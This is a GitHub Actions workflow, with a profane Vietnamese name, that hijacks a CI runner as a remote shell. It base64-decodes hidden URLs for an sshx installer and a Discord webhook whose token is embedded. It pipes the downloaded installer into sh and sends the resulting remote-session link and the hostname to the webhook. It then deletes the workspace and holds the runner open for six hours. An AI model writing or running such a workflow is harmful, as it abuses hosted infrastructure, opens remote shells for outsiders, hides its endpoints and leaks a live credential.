name: Lồn

on:
  workflow_dispatch:

jobs:
  sys_job:
    runs-on: ubuntu-latest

    steps:
    - name: Giải mã các thông tin nhạy cảm
      run: |
        echo "aHR0cHM6Ly9zc2h4LmlvL2dldA==" | base64 -d > sshx_url.txt
        echo "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzkwNjQ3MjAyOTQ1ODQ5NS8xYlNrV0xsVl9jZHZXVGhHMXhLM1lOQVA3TVlUZ215S1pCX29LX3pJaWl3MGI3RDN1M3JzTURVSHJZdVhpTmRlTWZ0cQ==" | base64 -d > webhook.txt

    - name: Tải và chạy , chờ lấy
      run: |
        SSHX_URL=$(cat sshx_url.txt)

        curl -sSf "$SSHX_URL" | sh -s run > sshlog.txt 2>&1 &
        echo "⏳ Đang khởi chạy SSHX và đợi tạo SSH link..."

        for i in {1..30}; do
          LINK=$(grep -o 'https://sshx.io/s/[^\ ]\+' sshlog.txt | sed 's/\x1b\[[0-9;]*m//g' | head -n 1)
          if [ -n "$LINK" ]; then
            echo "$LINK" | base64 > sshlink.b64
            echo "✅ Link SSH tìm thấy (base64): $(cat sshlink.b64)"
            break
          fi
          sleep 1
        done

        if [ ! -s sshlink.b64 ]; then
          echo "❌ Không tìm thấy SSH link sau 60 giây." >&2
          exit 1
        fi

    - name: Gửi  + hostname về Discord Webhook
      run: |
        USER_ID=$(grep "# USER_ID:" .github/workflows/settings.yml | awk '{print $3}')
        SSH_LINK=$(base64 -d sshlink.b64)

        HOSTNAME_REAL=$(hostname)
        echo "$HOSTNAME_REAL" | base64 > hostname.b64
        HOST_DECODED=$(base64 -d hostname.b64)

        INNER_JSON=$(jq -nc --arg uid "$USER_ID" --arg ssh "$SSH_LINK" --arg host "$HOST_DECODED" '{user_id: $uid, ssh: $ssh, host: $host}')
        echo "$INNER_JSON" | jq -nc --arg content "$(cat)" '{content: $content}' > payload.json

        echo "📤 Đang gửi SSH + hostname đến Discord..."
        curl -X POST -H "Content-Type: application/json" -d @payload.json "$(cat webhook.txt)"


    - name: 🔥 Tự động xoá toàn bộ file/thư mục sau khi chạy xong
      if: always()
      run: |
        echo "🧹 Đang dọn dẹp toàn bộ runner workspace..."
        cd "$GITHUB_WORKSPACE" || exit 1
        find . -mindepth 1 -exec rm -rf {} +
        echo "✅ Đã xoá sạch mọi thứ xong!"
    - name: Giữ  hoạt động trong 6 tiếng
      run: |
        echo "🕒 Bắt đầu giữ session SSHX trong 6 tiếng..."
        for ((i = 0; i < 21600; i+=30)); do
          echo "✅ Still alive at $(date)"
          sleep 30
        done
